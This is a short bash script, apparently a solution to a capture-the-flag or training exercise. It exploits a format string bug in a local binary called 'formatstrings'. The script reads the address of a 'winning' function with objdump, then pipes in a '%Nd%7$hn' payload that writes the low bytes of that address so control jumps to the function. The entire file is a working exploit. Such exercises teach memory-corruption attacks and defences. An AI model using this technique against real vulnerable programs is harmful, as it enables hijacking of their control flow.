#/usr/bin/bash

# get hex representation of last 2 bytes of winning function (assume it starts with 0804 + XX)
i=$(/usr/bin/python -c "print (int('$(objdump -d -j .text ./formatstrings|grep winning|cut -d ' ' -f1|cut -b5-)',16))")

# generate our string and test!
echo "num:$i"
python -c "print '%' + str($i) + 'd%7\$hn\r'"|./formatstrings 3|grep beat
